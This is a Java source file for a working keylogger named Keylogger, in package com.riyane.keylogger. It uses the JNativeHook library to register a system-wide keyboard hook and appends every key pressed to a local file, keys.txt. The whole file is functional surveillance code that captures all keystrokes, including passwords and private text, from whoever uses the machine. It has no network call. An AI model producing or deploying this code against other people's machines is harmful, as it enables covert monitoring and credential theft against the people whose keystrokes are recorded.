package com.riyane.keylogger;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

import org.jetbrains.annotations.NotNull;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class Keylogger implements NativeKeyListener {
    private final Path file = Paths.get("keys.txt");
    private static final Logger logger = LoggerFactory.getLogger( Keylogger.class );

    public static void main(String[] args) {
        logger.info("Key Logger has been started");
        try {
            GlobalScreen.registerNativeHook();
        } catch (@NotNull NativeHookException hookException) {
            logger.info(hookException.getMessage(), hookException);
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());
    }

    public void nativeKeyPressed(@NotNull NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }
        } catch (IOException exception) {
            logger.error(exception.getMessage(), exception);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}